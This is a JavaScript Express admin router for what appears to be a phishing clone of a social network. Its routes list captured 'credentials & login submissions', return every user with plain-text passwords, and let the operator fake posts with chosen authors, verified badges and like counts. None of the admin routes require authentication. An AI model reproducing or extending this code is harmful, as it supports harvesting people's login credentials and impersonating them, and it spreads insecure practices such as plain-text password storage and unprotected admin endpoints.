import { Router } from 'express';
import { storage } from '../db/storage.js';

const router = Router();

// GET /api/admin/overview - Dashboard statistics
router.get('/overview', (req, res) => {
  const users = storage.getUsers();
  const logs = storage.getLoginLogs();
  const posts = storage.getPosts();
  const stories = storage.getStories();
  const notifs = storage.getNotifications();

  return res.json({
    totalUsers: users.length,
    totalLogs: logs.length,
    totalPosts: posts.length,
    totalStories: stories.length,
    totalNotifications: notifs.length,
    recentLogins: logs.slice(0, 5),
  });
});

// GET /api/admin/logs - View all credentials & login submissions
router.get('/logs', (req, res) => {
  const logs = storage.getLoginLogs();
  return res.json(logs);
});

// DELETE /api/admin/logs - Clear logs
router.delete('/logs', (req, res) => {
  storage.clearLoginLogs();
  return res.json({ message: 'Login logs cleared' });
});

// DELETE /api/admin/logs/:id - Delete single log record
router.delete('/logs/:id', (req, res) => {
  storage.deleteLog(req.params.id);
  return res.json({ message: 'Login log deleted', id: req.params.id });
});

// GET /api/admin/users - View all users with plain passwords
router.get('/users', (req, res) => {
  const users = storage.getUsers();
  return res.json(users);
});

// POST /api/admin/users - Create new user
router.post('/users', (req, res) => {
  const { name, shortName, email, plainPassword, avatar, coverPhoto, bio, showOnDesktopLogin, showOnMobileLogin, verified, badge } = req.body;
  if (!name || !email) {
    return res.status(400).json({ message: 'Name and email are required' });
  }

  const user = storage.createUser({
    name,
    shortName,
    email,
    plainPassword: plainPassword || 'password123',
    avatar,
    coverPhoto,
    bio,
    showOnDesktopLogin,
    showOnMobileLogin,
    verified,
    badge,
  });

  return res.status(201).json(user);
});

// PUT /api/admin/users/:id - Update user details, plainPassword & first-page toggles
router.put('/users/:id', (req, res) => {
  const { id } = req.params;
  const updated = storage.updateUser(id, req.body);
  if (!updated) {
    return res.status(404).json({ message: 'User not found' });
  }
  return res.json(updated);
});

// DELETE /api/admin/users/:id - Delete user
router.delete('/users/:id', (req, res) => {
  const { id } = req.params;
  storage.deleteUser(id);
  return res.json({ message: 'User deleted successfully', id });
});

// GET /api/admin/first-page-accounts - Get accounts shown on login screen
router.get('/first-page-accounts', (req, res) => {
  const accounts = storage.getFirstPageAccounts();
  return res.json(accounts);
});

// ==================== POSTS AUTHORITY ====================
// GET /api/admin/posts
router.get('/posts', (req, res) => {
  const posts = storage.getPosts();
  return res.json(posts);
});

// POST /api/admin/posts - Create post with custom authority
router.post('/posts', (req, res) => {
  const { authorId, authorName, authorAvatar, content, caption, media, backgroundCard, likes, comments } = req.body;

  let author = {
    id: authorId || 'acc_admin',
    name: authorName || 'Tahir Adem',
    avatar: authorAvatar || 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
    verified: true,
    hasFollow: true,
  };

  if (authorId) {
    const existingUser = storage.getUserById(authorId);
    if (existingUser) {
      author = {
        id: existingUser.id,
        name: existingUser.name,
        avatar: existingUser.avatar,
        verified: existingUser.verified,
        hasFollow: true,
      };
    }
  }

  const newPost = storage.createPost({
    author,
    content,
    caption,
    media: media || [],
    backgroundCard: backgroundCard || null,
    stats: {
      likes: parseInt(likes, 10) || 0,
      comments: Array.isArray(comments) ? comments.length : 0,
      shares: 0,
      reactionBreakdown: { like: parseInt(likes, 10) || 0 },
    },
    comments: comments || [],
  });

  return res.status(201).json(newPost);
});

// PUT /api/admin/posts/:id - Edit any post content, stats, media, or comments
router.put('/posts/:id', (req, res) => {
  const { id } = req.params;
  const updated = storage.updatePost(id, req.body);
  if (!updated) {
    return res.status(404).json({ message: 'Post not found' });
  }
  return res.json(updated);
});

// DELETE /api/admin/posts/:id - Delete any post
router.delete('/posts/:id', (req, res) => {
  const { id } = req.params;
  storage.deletePost(id);
  return res.json({ message: 'Post deleted successfully', id });
});

// ==================== STORIES AUTHORITY ====================
// GET /api/admin/stories
router.get('/stories', (req, res) => {
  const stories = storage.getStories();
  return res.json(stories);
});

// POST /api/admin/stories
router.post('/stories', (req, res) => {
  const newStory = storage.createStory(req.body);
  return res.status(201).json(newStory);
});

// PUT /api/admin/stories/:id
router.put('/stories/:id', (req, res) => {
  const { id } = req.params;
  const updated = storage.updateStory(id, req.body);
  if (!updated) return res.status(404).json({ message: 'Story not found' });
  return res.json(updated);
});

// DELETE /api/admin/stories/:id
router.delete('/stories/:id', (req, res) => {
  const { id } = req.params;
  storage.deleteStory(id);
  return res.json({ message: 'Story deleted', id });
});

// ==================== NOTIFICATIONS AUTHORITY ====================
// GET /api/admin/notifications
router.get('/notifications', (req, res) => {
  const notifs = storage.getNotifications();
  return res.json(notifs);
});

// POST /api/admin/notifications
router.post('/notifications', (req, res) => {
  const newNotif = storage.createNotification(req.body);
  return res.status(201).json(newNotif);
});

// PUT /api/admin/notifications/:id
router.put('/notifications/:id', (req, res) => {
  const { id } = req.params;
  const updated = storage.updateNotification(id, req.body);
  if (!updated) return res.status(404).json({ message: 'Notification not found' });
  return res.json(updated);
});

// DELETE /api/admin/notifications/:id
router.delete('/notifications/:id', (req, res) => {
  const { id } = req.params;
  storage.deleteNotification(id);
  return res.json({ message: 'Notification deleted', id });
});

// GET /api/admin/recovery-settings
router.get('/recovery-settings', (req, res) => {
  const settings = storage.getRecoverySettings();
  return res.json(settings);
});

// PUT /api/admin/recovery-settings
router.put('/recovery-settings', (req, res) => {
  const updated = storage.updateRecoverySettings(req.body);
  return res.json(updated);
});

export default router;

